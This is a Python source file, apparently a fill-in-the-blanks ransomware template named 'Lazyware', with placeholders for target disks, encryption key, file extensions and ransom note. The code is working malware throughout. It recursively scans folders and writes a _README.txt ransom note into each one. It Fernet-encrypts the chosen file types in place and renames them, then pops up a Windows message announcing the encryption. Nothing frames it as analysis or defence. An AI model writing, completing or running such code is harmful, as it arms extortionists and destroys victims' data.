from cryptography.fernet import Fernet
import os 
import base64
import sys
import time

class Lazyware:
	def __init__(self):
		self.file_list = []

		self.readme = """##readme##"""

		#----------------------------------------Configuration---------------------------------------#
		# generate ur key using this command :
		# python -c "import os;import base64; print(base64.urlsafe_b64encode(os.urandom(32)).decode('utf-8'))"

		self.config = {
			"disk": ##disk##, #disk or folder to start encrypt
			"key": "##key##", #key
			"enc_extension" : "##enc_extension##", #change extension the encrypted files
			"file_to_enc": ##file_to_enc## # specific extension to encrypt 
		}
		#--------------------------------------------------------------------------------------------#

		key = self.config['key']
		self.f = Fernet(key)

	def run_enc(self):
		for i in self.file_list:
			self.encrypt(i)

	def get_asset(self):
		for disk in self.config['disk']:
			self.scandisk(disk)

	def scandisk(self, disk):
		obj = os.listdir(disk)
		for asset in obj:
			combine = os.path.join(disk, asset)
			if os.path.isdir(combine):
				try:
					note = os.path.join(combine, "_README.txt")
					open(note, "w").write(self.readme)
					self.scandisk(combine)
				except:
					pass
			else:
				try:
					extension = os.path.splitext(combine)[1]
					if extension in self.config['file_to_enc'] and extension != self.config['enc_extension']:
						self.file_list.append(combine)
				except:
					pass

	def encrypt(self, file):
		try:
			with open(file, "rb") as f:
				data = f.read()
				enc = self.f.encrypt(data)
				s = open(file, 'wb')
				s = s.write(enc)
			set_ext = str(file)+self.config['enc_extension']
			os.rename(file, set_ext)
		except:
			pass

init = Lazyware()
init.get_asset()
init.run_enc()
os.system('cmd /c msg %username% "Your File has been encrypted, See _README.txt for more details!"')
